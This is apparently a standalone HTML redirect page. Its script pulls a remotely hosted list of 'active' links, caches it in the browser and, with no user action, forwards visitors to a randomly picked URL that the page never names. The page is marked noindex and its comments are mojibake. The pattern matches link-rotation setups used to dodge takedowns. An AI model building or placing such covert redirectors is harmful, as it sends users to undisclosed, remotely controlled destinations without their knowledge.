<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="robots" content="noindex,nofollow">
  <style>
    body {
      margin: 0;
      padding: 0;
      background: #fff;
      font-family: sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
  </style>

  <script>
    (async () => {
      const MAIN_JSON_URL = "https://liuhongliang11895.github.io/888/mapping.json";
      const LOCAL_KEY = "lastActiveLinks";
      let activeLinks = [];

      // ÊòæÁ§∫ÊèêÁ§∫
      document.body.innerHTML = `<div>Connecting... Please wait...</div>`;

      try {
        const res = await fetch(MAIN_JSON_URL + "?ts=" + Date.now(), { cache: "no-store" });
        const data = await res.json();
        activeLinks = data.links.filter(l => l.active);

        if (activeLinks.length) {
          localStorage.setItem(LOCAL_KEY, JSON.stringify(activeLinks));
          const idx = Math.floor(Math.random() * activeLinks.length);
          
          // üî•üî•üî• Ëá™Âä®Ë∑≥ËΩ¨ÔºåÊó†ÈúÄÁî®Êà∑ÁÇπÂáª
          setTimeout(() => {
            location.href = activeLinks[idx].url;
          }, 10);

          return;
        }
      } catch (err) {}

      const cached = JSON.parse(localStorage.getItem(LOCAL_KEY) || "[]");
      if (cached.length) {
        const idx = Math.floor(Math.random() * cached.length);
        setTimeout(() => {
          location.href = cached[idx].url;
        }, 10);
        return;
      }

      document.body.innerHTML = `<div>System busy. Try again.</div>`;
    })();
  </script>
</head>
<body></body>
</html>
